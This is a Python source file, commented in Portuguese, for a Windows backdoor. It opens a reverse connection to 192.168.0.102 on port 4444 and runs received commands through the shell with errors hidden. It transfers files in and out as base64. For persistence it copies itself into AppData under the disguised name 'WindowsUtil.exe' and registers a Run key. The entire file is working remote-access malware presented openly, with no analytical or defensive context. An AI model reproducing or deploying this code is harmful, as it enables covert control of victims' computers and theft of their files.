import socket, subprocess, json, os, base64, sys, shutil
class Backdoor:
    def __init__(self, ip, port):
        self.save_on_startup()
        self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.s.connect((ip, port))

    def serial_send(self, data):
        json_data = json.dumps(data)
        self.s.send(json_data.encode())

    def serial_receive(self):
        json_data = b""
        while True:
            try:
                json_data += self.s.recv(1024)
                return json.loads(json_data)
            except ValueError:  # Se o json não estiver completo
                continue
    def save_on_startup(self):
        location = os.environ["appdata"] + "\\WindowsUtil.exe"
        if not os.path.exists(location):
            shutil.copyfile(sys.executable, location)
            subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v test / t REG_SZ /d "{}"'.format(location), shell=True)
    def change_directory(self, path):
        os.chdir(path)
        new_directory = os.getcwd()
        return f"[+] Mudança para {new_directory}"

    def execute_command(self, command):
        try:
            return (subprocess.check_output(command, shell=True, stderr= subprocess.DEVNULL, stdin=subprocess.DEVNULL)).decode('utf-8',errors="ignore")
        except Exception:
            return "[-] Erro na execucao do comando"
    def write_file(self,path,content):
        content = base64.b64decode(content)
        if not isinstance(content,bytes):
            content = content.encode()
        with open(path, 'wb') as file:
            file.write(content)
            return "[+] Arquivo baixado"

    def read_file(self,path):
        with open(path, "rb") as file:
            return base64.b64encode(file.read())

    def start(self):
        while (1):
            comando = self.serial_receive()
            try:
                if comando[0] == ":q":  # comando pode ser tratado como lista por vir de um json
                    self.stop()
                    break
                elif comando[0] == "cd" and len(comando) > 1:
                    exec_result = self.change_directory(comando[1])
                elif comando[0] == "download" and len(comando) > 1:
                    exec_result = self.read_file(comando[1])
                    exec_result = exec_result.decode('utf-8', errors="ignore")
                elif comando[0] == "upload" and len(comando) > 1:
                    exec_result = self.write_file(comando[1],comando[2])
                else:
                    exec_result = self.execute_command(comando)
            except Exception:#Exception genérica
                exec_result = "[-] Erro em algum comando"
            self.serial_send(exec_result)

    def stop(self):
        self.s.close()

try:
    bckdr = Backdoor("192.168.0.102", 4444)
    bckdr.start()
except Exception:
    sys.exit()
